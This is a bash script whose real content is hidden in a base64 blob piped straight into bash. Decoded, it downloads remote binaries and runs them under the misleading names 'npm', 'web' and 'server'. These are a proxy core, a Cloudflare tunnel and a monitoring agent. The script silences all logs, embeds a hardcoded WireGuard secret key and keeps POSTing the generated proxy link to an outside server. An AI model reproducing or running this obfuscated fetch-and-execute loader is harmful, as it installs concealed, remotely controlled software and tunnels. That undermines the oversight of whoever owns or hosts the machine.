#!/usr/bin/env bash

YML_FILE="./c.yml"

if [ -s "$YML_FILE" ]; then
    source "$YML_FILE"
fi

echo "aWYgWyAhIC1kICIkRklMRV9QQVRIIiBdOyB0aGVuCiAgbWtkaXIgLXAgIiRGSUxFX1BBVEgiCmZpCgpjbGVhbnVwX2ZpbGVzKCkgewogIHJtIC1yZiAke0ZJTEVfUEFUSH0vKi5sb2cgJHtGSUxFX1BBVEh9LyouanNvbiAke0ZJTEVfUEFUSH0vKi50eHQgJHtGSUxFX1BBVEh9Lyouc2ggJHtGSUxFX1BBVEh9L3R1bm5lbC4qCn0KY2xlYW51cF9maWxlcwoKIyBEb3dubG9hZCBEZXBlbmRlbmN5IEZpbGVzCnNldF9kb3dubG9hZF91cmwoKSB7CiAgbG9jYWwgcHJvZ3JhbV9uYW1lPSIkMSIKICBsb2NhbCBkZWZhdWx0X3VybD0iJDIiCiAgbG9jYWwgeDY0X3VybD0iJDMiCgogIGlmIFsgIiQodW5hbWUgLW0pIiA9ICJ4ODZfNjQiIF0gfHwgWyAiJCh1bmFtZSAtbSkiID0gImFtZDY0IiBdIHx8IFsgIiQodW5hbWUgLW0pIiA9ICJ4NjQiIF07IHRoZW4KICAgIGRvd25sb2FkX3VybD0iJHg2NF91cmwiCiAgZWxzZQogICAgZG93bmxvYWRfdXJsPSIkZGVmYXVsdF91cmwiCiAgZmkKfQoKZG93bmxvYWRfcHJvZ3JhbSgpIHsKICBsb2NhbCBwcm9ncmFtX25hbWU9IiQxIgogIGxvY2FsIGRlZmF1bHRfdXJsPSIkMiIKICBsb2NhbCB4NjRfdXJsPSIkMyIKCiAgc2V0X2Rvd25sb2FkX3VybCAiJHByb2dyYW1fbmFtZSIgIiRkZWZhdWx0X3VybCIgIiR4NjRfdXJsIgoKICBpZiBbICEgLWYgIiRwcm9ncmFtX25hbWUiIF07IHRoZW4KICAgIGlmIFsgLW4gIiRkb3dubG9hZF91cmwiIF07IHRoZW4KICAgICAgZWNobyAiRG93bmxvYWRpbmcgJHByb2dyYW1fbmFtZS4uLiIgPiAvZGV2L251bGwKICAgICAgIyB3Z2V0IC1xTyAiJHByb2dyYW1fbmFtZSIgIiRkb3dubG9hZF91cmwiCiAgICAgIGN1cmwgLXNTTCAiJGRvd25sb2FkX3VybCIgLW8gIiRwcm9ncmFtX25hbWUiCiAgICAgIGVjaG8gIkRvd25sb2FkZWQgJHByb2dyYW1fbmFtZSIgPiAvZGV2L251bGwKICAgIGVsc2UKICAgICAgZWNobyAiU2tpcHBpbmcgZG93bmxvYWQgZm9yICRwcm9ncmFtX25hbWUiID4gL2Rldi9udWxsCiAgICBmaQogIGVsc2UKICAgIGVjaG8gIiRwcm9ncmFtX25hbWUgYWxyZWFkeSBleGlzdHMsIHNraXBwaW5nIGRvd25sb2FkIiA+IC9kZXYvbnVsbAogIGZpCn0KCmlmIFsgLW4gIiR7TkVaSEFfU0VSVkVSfSIgXSAmJiBbIC1uICIke05FWkhBX0tFWX0iIF07IHRoZW4KICBkb3dubG9hZF9wcm9ncmFtICIke0ZJTEVfUEFUSH0vbnBtIiAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2thaHVuYW1hL215ZmlsZS9tYWluL25lemhhL25lemhhLWFnZW50KGFybSkiICJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20va2FodW5hbWEvbXlmaWxlL21haW4vbmV6aGEvbmV6aGEtYWdlbnQiCiAgY2htb2QgK3ggJHtGSUxFX1BBVEh9L25wbQogIHNsZWVwIDMKZmkKCmRvd25sb2FkX3Byb2dyYW0gIiR7RklMRV9QQVRIfS93ZWIiICJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20va2FodW5hbWEvbXlmaWxlL21haW4vbXkvd2ViLmpzKGFybSkiICJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20va2FodW5hbWEvbXlmaWxlL21haW4vbXkvd2ViLmpzIgpjaG1vZCAreCAke0ZJTEVfUEFUSH0vd2ViCnNsZWVwIDMKCmRvd25sb2FkX3Byb2dyYW0gIiR7RklMRV9QQVRIfS9zZXJ2ZXIiICJodHRwczovL2dpdGh1Yi5jb20vY2xvdWRmbGFyZS9jbG91ZGZsYXJlZC9yZWxlYXNlcy9sYXRlc3QvZG93bmxvYWQvY2xvdWRmbGFyZWQtbGludXgtYXJtNjQiICJodHRwczovL2dpdGh1Yi5jb20vY2xvdWRmbGFyZS9jbG91ZGZsYXJlZC9yZWxlYXNlcy9sYXRlc3QvZG93bmxvYWQvY2xvdWRmbGFyZWQtbGludXgtYW1kNjQiCmNobW9kICt4ICR7RklMRV9QQVRIfS9zZXJ2ZXIKc2xlZXAgMwoKIyBHZW5lcmF0ZSBjb25maWd1cmF0aW9uCmdlbmVyYXRlX2NvbmZpZygpIHsKICBjYXQgPiAke0ZJTEVfUEFUSH0vb3V0Lmpzb24gPDwgRU9GCnsKICAgICJsb2ciOnsKICAgICAgICAiYWNjZXNzIjoiL2Rldi9udWxsIiwKICAgICAgICAiZXJyb3IiOiIvZGV2L251bGwiLAogICAgICAgICJsb2dsZXZlbCI6Im5vbmUiCiAgICB9LAogICAgImluYm91bmRzIjpbCiAgICAgICAgewogICAgICAgICAgICAicG9ydCI6JFZfUE9SVCwKICAgICAgICAgICAgInByb3RvY29sIjoidmxlc3MiLAogICAgICAgICAgICAic2V0dGluZ3MiOnsKICAgICAgICAgICAgICAgICJjbGllbnRzIjpbCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAiaWQiOiIke1VVSUR9IiwKICAgICAgICAgICAgICAgICAgICAgICAgImZsb3ciOiJ4dGxzLXJwcngtdmlzaW9uIgogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIF0sCiAgICAgICAgICAgICAgICAiZGVjcnlwdGlvbiI6Im5vbmUiLAogICAgICAgICAgICAgICAgImZhbGxiYWNrcyI6WwogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgImRlc3QiOjMwMDEKICAgICAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgInBhdGgiOiIvJHtWTEVTU19XU1BBVEh9IiwKICAgICAgICAgICAgICAgICAgICAgICAgImRlc3QiOjMwMDIKICAgICAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgInBhdGgiOiIvJHtWTUVTU19XU1BBVEh9IiwKICAgICAgICAgICAgICAgICAgICAgICAgImRlc3QiOjMwMDMKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBdCiAgICAgICAgICAgIH0sCiAgICAgICAgICAgICJzdHJlYW1TZXR0aW5ncyI6ewogICAgICAgICAgICAgICAgIm5ldHdvcmsiOiJ0Y3AiCiAgICAgICAgICAgIH0KICAgICAgICB9LAogICAgICAgIHsKICAgICAgICAgICAgInBvcnQiOjMwMDEsCiAgICAgICAgICAgICJsaXN0ZW4iOiIxMjcuMC4wLjEiLAogICAgICAgICAgICAicHJvdG9jb2wiOiJ2bGVzcyIsCiAgICAgICAgICAgICJzZXR0aW5ncyI6ewogICAgICAgICAgICAgICAgImNsaWVudHMiOlsKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICJpZCI6IiR7VVVJRH0iCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgXSwKICAgICAgICAgICAgICAgICJkZWNyeXB0aW9uIjoibm9uZSIKICAgICAgICAgICAgfSwKICAgICAgICAgICAgInN0cmVhbVNldHRpbmdzIjp7CiAgICAgICAgICAgICAgICAibmV0d29yayI6IndzIiwKICAgICAgICAgICAgICAgICJzZWN1cml0eSI6Im5vbmUiCiAgICAgICAgICAgIH0KICAgICAgICB9LAogICAgICAgIHsKICAgICAgICAgICAgInBvcnQiOjMwMDIsCiAgICAgICAgICAgICJsaXN0ZW4iOiIxMjcuMC4wLjEiLAogICAgICAgICAgICAicHJvdG9jb2wiOiJ2bGVzcyIsCiAgICAgICAgICAgICJzZXR0aW5ncyI6ewogICAgICAgICAgICAgICAgImNsaWVudHMiOlsKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICJpZCI6IiR7VVVJRH0iLAogICAgICAgICAgICAgICAgICAgICAgICAibGV2ZWwiOjAKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBdLAogICAgICAgICAgICAgICAgImRlY3J5cHRpb24iOiJub25lIgogICAgICAgICAgICB9LAogICAgICAgICAgICAic3RyZWFtU2V0dGluZ3MiOnsKICAgICAgICAgICAgICAgICJuZXR3b3JrIjoid3MiLAogICAgICAgICAgICAgICAgInNlY3VyaXR5Ijoibm9uZSIsCiAgICAgICAgICAgICAgICAid3NTZXR0aW5ncyI6ewogICAgICAgICAgICAgICAgICAgICJwYXRoIjoiLyR7VkxFU1NfV1NQQVRIfSIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfSwKICAgICAgICAgICAgInNuaWZmaW5nIjp7CiAgICAgICAgICAgICAgICAiZW5hYmxlZCI6dHJ1ZSwKICAgICAgICAgICAgICAgICJkZXN0T3ZlcnJpZGUiOlsKICAgICAgICAgICAgICAgICAgICAiaHR0cCIsCiAgICAgICAgICAgICAgICAgICAgInRscyIsCiAgICAgICAgICAgICAgICAgICAgInF1aWMiCiAgICAgICAgICAgICAgICBdLAogICAgICAgICAgICAgICAgIm1ldGFkYXRhT25seSI6ZmFsc2UKICAgICAgICAgICAgfQogICAgICAgIH0sCiAgICAgICAgewogICAgICAgICAgICAicG9ydCI6MzAwMywKICAgICAgICAgICAgImxpc3RlbiI6IjEyNy4wLjAuMSIsCiAgICAgICAgICAgICJwcm90b2NvbCI6InZtZXNzIiwKICAgICAgICAgICAgInNldHRpbmdzIjp7CiAgICAgICAgICAgICAgICAiY2xpZW50cyI6WwogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgImlkIjoiJHtVVUlEfSIsCiAgICAgICAgICAgICAgICAgICAgICAgICJhbHRlcklkIjowCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgXQogICAgICAgICAgICB9LAogICAgICAgICAgICAic3RyZWFtU2V0dGluZ3MiOnsKICAgICAgICAgICAgICAgICJuZXR3b3JrIjoid3MiLAogICAgICAgICAgICAgICAgIndzU2V0dGluZ3MiOnsKICAgICAgICAgICAgICAgICAgICAicGF0aCI6Ii8ke1ZNRVNTX1dTUEFUSH0iCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0sCiAgICAgICAgICAgICJzbmlmZmluZyI6ewogICAgICAgICAgICAgICAgImVuYWJsZWQiOnRydWUsCiAgICAgICAgICAgICAgICAiZGVzdE92ZXJyaWRlIjpbCiAgICAgICAgICAgICAgICAgICAgImh0dHAiLAogICAgICAgICAgICAgICAgICAgICJ0bHMiLAogICAgICAgICAgICAgICAgICAgICJxdWljIgogICAgICAgICAgICAgICAgXSwKICAgICAgICAgICAgICAgICJtZXRhZGF0YU9ubHkiOmZhbHNlCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICBdLAogICAgImRucyI6ewogICAgICAgICJzZXJ2ZXJzIjpbCiAgICAgICAgICAgICJodHRwcytsb2NhbDovLzguOC44LjgvZG5zLXF1ZXJ5IgogICAgICAgIF0KICAgIH0sCiAgICAib3V0Ym91bmRzIjpbCiAgICAgICAgewogICAgICAgICAgICAicHJvdG9jb2wiOiJmcmVlZG9tIgogICAgICAgIH0sCiAgICAgICAgewogICAgICAgICAgICAidGFnIjoiV0FSUCIsCiAgICAgICAgICAgICJwcm90b2NvbCI6IndpcmVndWFyZCIsCiAgICAgICAgICAgICJzZXR0aW5ncyI6ewogICAgICAgICAgICAgICAgInNlY3JldEtleSI6IllGWU9BZGJ3MWJLVEhsTk5pK2FFakJNM0JPN3VudUZDNXJPa01SQXo5WFk9IiwKICAgICAgICAgICAgICAgICJhZGRyZXNzIjpbCiAgICAgICAgICAgICAgICAgICAgIjE3Mi4xNi4wLjIvMzIiLAogICAgICAgICAgICAgICAgICAgICIyNjA2OjQ3MDA6MTEwOjhhMzY6ZGY5MjoxMDJhOjk2MDI6ZmExOC8xMjgiCiAgICAgICAgICAgICAgICBdLAogICAgICAgICAgICAgICAgInBlZXJzIjpbCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAicHVibGljS2V5IjoiYm1YT0MrRjFGeEVNRjlkeWlLMkg1LzFTVXR6SDBKdVZvNTFoMndQZmd5bz0iLAogICAgICAgICAgICAgICAgICAgICAgICAiYWxsb3dlZElQcyI6WwogICAgICAgICAgICAgICAgICAgICAgICAgICAgIjAuMC4wLjAvMCIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAiOjovMCIKICAgICAgICAgICAgICAgICAgICAgICAgXSwKICAgICAgICAgICAgICAgICAgICAgICAgImVuZHBvaW50IjoiMTYyLjE1OS4xOTMuMTA6MjQwOCIKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBdLAogICAgICAgICAgICAgICAgInJlc2VydmVkIjpbNzgsIDEzNSwgNzZdLAogICAgICAgICAgICAgICAgIm10dSI6MTI4MAogICAgICAgICAgICB9CiAgICAgICAgfQogICAgXSwKICAgICJyb3V0aW5nIjp7CiAgICAgICAgImRvbWFpblN0cmF0ZWd5IjoiQXNJcyIsCiAgICAgICAgInJ1bGVzIjpbCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICJ0eXBlIjoiZmllbGQiLAogICAgICAgICAgICAgICAgImRvbWFpbiI6WwogICAgICAgICAgICAgICAgICAgICJkb21haW46b3BlbmFpLmNvbSIsCiAgICAgICAgICAgICAgICAgICAgImRvbWFpbjphaS5jb20iCiAgICAgICAgICAgICAgICBdLAogICAgICAgICAgICAgICAgIm91dGJvdW5kVGFnIjoiV0FSUCIKICAgICAgICAgICAgfQogICAgICAgIF0KICAgIH0KfQpFT0YKfQoKYXJnb190eXBlKCkgewogIGlmIFsgLXogIiRBUkdPX0FVVEgiIF0gJiYgWyAteiAiJEFSR09fRE9NQUlOIiBdOyB0aGVuCiAgICBlY2hvICJBUkdPX0FVVEggb3IgQVJHT19ET01BSU4gaXMgZW1wdHksIHVzZSBRdWljayBUdW5uZWxzIiA+IC9kZXYvbnVsbAogICAgcmV0dXJuCiAgZmkKCiAgaWYgWyAtbiAiJChlY2hvICIkQVJHT19BVVRIIiB8IGdyZXAgVHVubmVsU2VjcmV0KSIgXTsgdGhlbgogICAgZWNobyAkQVJHT19BVVRIID4gJHtGSUxFX1BBVEh9L3R1bm5lbC5qc29uCiAgICBjYXQgPiAke0ZJTEVfUEFUSH0vdHVubmVsLnltbCA8PCBFT0YKdHVubmVsPSQoZWNobyAiJEFSR09fQVVUSCIgfCBjdXQgLWRcIiAtZjEyKQpjcmVkZW50aWFscy1maWxlOiAke0ZJTEVfUEFUSH0vdHVubmVsLmpzb24KcHJvdG9jb2w6IGh0dHAyCgppbmdyZXNzOgogIC0gaG9zdG5hbWU6ICRBUkdPX0RPTUFJTgogICAgc2VydmljZTogaHR0cDovL2xvY2FsaG9zdDogJFZfUE9SVAogICAgb3JpZ2luUmVxdWVzdDoKICAgICAgbm9UTFNWZXJpZnk6IHRydWUKICAtIHNlcnZpY2U6IGh0dHBfc3RhdHVzOjQwNApFT0YKICBlbHNlCiAgICBlY2hvICJBUkdPX0FVVEggTWlzbWF0Y2ggVHVubmVsU2VjcmV0IiA+IC9kZXYvbnVsbAogIGZpCn0KCmFyZ3MoKSB7CmlmIFsgLWUgJHtGSUxFX1BBVEh9L3NlcnZlciBdOyB0aGVuCiAgaWYgWyAtbiAiJChlY2hvICIkQVJHT19BVVRIIiB8IGdyZXAgJ15bQS1aMC05YS16PV1cezEyMCwyNTBcfSQnKSIgXTsgdGhlbgogICAgYXJncz0idHVubmVsIC0tZWRnZS1pcC12ZXJzaW9uIGF1dG8gLS1wcm90b2NvbCBodHRwMiBydW4gLS11cmwgaHR0cDovL2xvY2FsaG9zdDokVl9QT1JUIC0tdG9rZW4gJHtBUkdPX0FVVEh9IgogIGVsaWYgWyAtbiAiJChlY2hvICIkQVJHT19BVVRIIiB8IGdyZXAgVHVubmVsU2VjcmV0KSIgXTsgdGhlbgogICAgYXJncz0idHVubmVsIC0tZWRnZS1pcC12ZXJzaW9uIGF1dG8gLS1jb25maWcgdHVubmVsLnltbCBydW4iCiAgZWxzZQogICAgYXJncz0idHVubmVsIC0tZWRnZS1pcC12ZXJzaW9uIGF1dG8gLS1wcm90b2NvbCBodHRwMiAtLW5vLWF1dG91cGRhdGUgLS1sb2dmaWxlICR7RklMRV9QQVRIfS9ib290LmxvZyAtLXVybCBodHRwOi8vbG9jYWxob3N0OiRWX1BPUlQiCiAgZmkKZmkKfQoKZ2VuZXJhdGVfY29uZmlnCmFyZ29fdHlwZQphcmdzCgojIOS4iuS8oOiuoumYhQp1cGxvYWRfc3Vic2NyaXB0aW9uKCkgewogICAgZG93bmxvYWRfdG9vbD0oImN1cmwiKQogICAgaWYgWyAiJGRvd25sb2FkX3Rvb2wiID0gImN1cmwiIF07IHRoZW4KICAgICAgICByZXNwb25zZT0kKGN1cmwgLXMgLVggUE9TVCAtSCAiQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9qc29uIiAtZCAie1wiVVJMX05BTUVcIjpcIiRTVUJfTkFNRVwiLFwiVVJMXCI6XCIkVVBMT0FEX0RBVEFcIn0iICRTVUJfVVJMKQogICAgZWxzZQogICAgICAgIHJlc3BvbnNlPSQod2dldCAtcU8tIC0tcG9zdC1kYXRhPSJ7XCJVUkxfTkFNRVwiOlwiJFNVQl9OQU1FXCIsXCJVUkxcIjpcIiRVUExPQURfREFUQVwifSIgLS1oZWFkZXI9IkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vanNvbiIgJFNVQl9VUkwpCiAgICBmaQoKICAgICMg5Luj56CB5qOA5p+l5pyA5ZCO5LiA5Liq5ZG95Luk5piv5ZCm6L+Q6KGM5rKh5pyJ5Lu75L2V6Zeu6aKY44CC5aaC5p6c5piv77yM5YiZ5bCG5omn6KGM6ZqP5ZCO55qE5Luj56CB5Z2XCiAgICBpZiBbICQ/IC1lcSAwIF07IHRoZW4KICAgICAgICBzbGVlcCAxCiAgICBlbHNlCiAgICAgICAgZWNobyAiU3ViIFVwbG9hZCBmYWlsZWQiCiAgICBmaQp9CgojIGdldCBjb3VudHJ5CmdldF9jb3VudHJ5X2NvZGUoKSB7CiAgZXhwb3J0IGNvdW50cnlfYWJicmV2aWF0aW9uPSQoY3VybCAtcyBodHRwczovL3NwZWVkLmNsb3VkZmxhcmUuY29tL21ldGEgfCBhd2sgLUZcIiAne3ByaW50ICQyNiItIiQxOH0nIHwgc2VkIC1lICdzLyAvXy9nJykgICAjIOaYvuekuklTUOWPiuWbveWutueugOensAogICMgZXhwb3J0IGNvdW50cnlfYWJicmV2aWF0aW9uPSQoY3VybCAtcyBodHRwczovL3NwZWVkLmNsb3VkZmxhcmUuY29tL21ldGEgfCB0ciAnLCcgJ1xuJyB8IGdyZXAgLUUgJyJjb3VudHJ5IlxzKjpccyoiJyB8IHNlZCAncy8uKiJjb3VudHJ5IlxzKjpccyoiXChbXiJdKlwpIi4qL1wxLycpICAgIyDlj6rmmL7npLrlm73lrrbnroDnp7AKICAjIGVjaG8gIiR7Y291bnRyeV9hYmJyZXZpYXRpb259Igp9CgojIGNoZWNrX2hvc3RuYW1lCmNoZWNrX2hvc3RuYW1lX2NoYW5nZSgpIHsKICBpZiBbIC16ICIkQVJHT19BVVRIIiBdICYmIFsgLXogIiRBUkdPX0RPTUFJTiIgXTsgdGhlbgogICAgWyAtcyAke0ZJTEVfUEFUSH0vYm9vdC5sb2cgXSAmJiBleHBvcnQgQVJHT19ET01BSU49JChjYXQgJHtGSUxFX1BBVEh9L2Jvb3QubG9nIHwgZ3JlcCAtbyAiaW5mby4qaHR0cHM6Ly8uKnRyeWNsb3VkZmxhcmUuY29tIiB8IHNlZCAic0AuKmh0dHBzOi8vQEBnIiB8IHRhaWwgLW4gMSkKICAgICMgWyAtcyAke0ZJTEVfUEFUSH0vYm9vdC5sb2cgXSAmJiBleHBvcnQgQVJHT19ET01BSU49JChjYXQgJHtGSUxFX1BBVEh9L2Jvb3QubG9nIHwgZ3JlcCAtbyAiaHR0cHM6Ly8uKnRyeWNsb3VkZmxhcmUuY29tIiB8IHRhaWwgLW4gMSB8IHNlZCAncy9odHRwczpcL1wvLy8nKQogIGZpCn0KCiMgYnVpbGRfdXJscwpidWlsZF91cmxzKCkgewogIGNoZWNrX2hvc3RuYW1lX2NoYW5nZQoKICBleHBvcnQgVk1FU1M9InsgXCJ2XCI6IFwiMlwiLCBcInBzXCI6IFwidm1lc3MtJHtjb3VudHJ5X2FiYnJldmlhdGlvbn0tJHtTVUJfTkFNRX1cIiwgXCJhZGRcIjogXCIke0NGX0lQfVwiLCBcInBvcnRcIjogXCIke0NGUE9SVH1cIiwgXCJpZFwiOiBcIiR7VVVJRH1cIiwgXCJhaWRcIjogXCIwXCIsIFwic2N5XCI6IFwibm9uZVwiLCBcIm5ldFwiOiBcIndzXCIsIFwidHlwZVwiOiBcIm5vbmVcIiwgXCJob3N0XCI6IFwiJHtBUkdPX0RPTUFJTn1cIiwgXCJwYXRoXCI6IFwiLyR7Vk1FU1NfV1NQQVRIfT9lZD0yMDQ4XCIsIFwidGxzXCI6IFwidGxzXCIsIFwic25pXCI6IFwiJHtBUkdPX0RPTUFJTn1cIiwgXCJhbHBuXCI6IFwiXCIgfSIKCnZsZXNzX3VybD0idmxlc3M6Ly8ke1VVSUR9QCR7Q0ZfSVB9OiR7Q0ZQT1JUfT9ob3N0PSR7QVJHT19ET01BSU59JnBhdGg9JTJGJHtWTEVTU19XU1BBVEh9JTNGZWQlM0QyMDQ4JnR5cGU9d3MmZW5jcnlwdGlvbj1ub25lJnNlY3VyaXR5PXRscyZzbmk9JHtBUkdPX0RPTUFJTn0jdmxlc3MtJHtjb3VudHJ5X2FiYnJldmlhdGlvbn0tJHtTVUJfTkFNRX0iCmV4cG9ydCBVUExPQURfREFUQT0iJHZsZXNzX3VybCIKfQoKIyBydW4KcnVuKCkgewogIGlmIFsgLWUgJHtGSUxFX1BBVEh9L3NlcnZlciBdOyB0aGVuCiAgICBbWyAkKHBpZG9mIHNlcnZlcikgXV0gJiYgcmV0dXJuCiAgICAke0ZJTEVfUEFUSH0vc2VydmVyICRhcmdzID4vZGV2L251bGwgMj4mMSAmCiAgZmkKCiAgaWYgWyAtZSAke0ZJTEVfUEFUSH0vd2ViIF07IHRoZW4KICAgIFtbICQocGlkb2Ygd2ViKSBdXSAmJiByZXR1cm4KICAgICR7RklMRV9QQVRIfS93ZWIgcnVuIC1jICR7RklMRV9QQVRIfS9vdXQuanNvbiA+L2Rldi9udWxsIDI+JjEgJgogIGZpCgogIGlmIFsgLW4gIiR7TkVaSEFfU0VSVkVSfSIgXSAmJiBbIC1uICIke05FWkhBX0tFWX0iIF0gJiYgWyAtZSAke0ZJTEVfUEFUSH0vbnBtIF07IHRoZW4KICAgIFtbICQocGlkb2YgbnBtKSBdXSAmJiByZXR1cm4KICAgIHRsc1BvcnRzPSgiNDQzIiAiODQ0MyIgIjIwOTYiICIyMDg3IiAiMjA4MyIgIjIwNTMiKQogICAgaWYgW1sgIiAke3Rsc1BvcnRzW0BdfSAiID1+ICIgJHtORVpIQV9QT1JUfSAiIF1dOyB0aGVuCiAgICAgIE5FWkhBX1RMUz0iLS10bHMiCiAgICBlbHNlCiAgICAgIE5FWkhBX1RMUz0iIgogICAgZmkKICAgICR7RklMRV9QQVRIfS9ucG0gLXMgJHtORVpIQV9TRVJWRVJ9OiR7TkVaSEFfUE9SVH0gLXAgJHtORVpIQV9LRVl9ICR7TkVaSEFfVExTfSA+L2Rldi9udWxsIDI+JjEgJgogIGZpCgogIHNsZWVwIDEwCgogIGdldF9jb3VudHJ5X2NvZGUgJiYgYnVpbGRfdXJscwoKICBpZiBbIC1uICIke1NVQl9VUkx9IiBdOyB0aGVuCiAgICB3aGlsZSB0cnVlOyBkbwogICAgICBjaGVja19ob3N0bmFtZV9jaGFuZ2UKICAgICAgdXBsb2FkX3N1YnNjcmlwdGlvbgogICAgICBzbGVlcCAxMDAKICAgIGRvbmUKICBmaQp9CgpydW4K" | base64 -d | bash
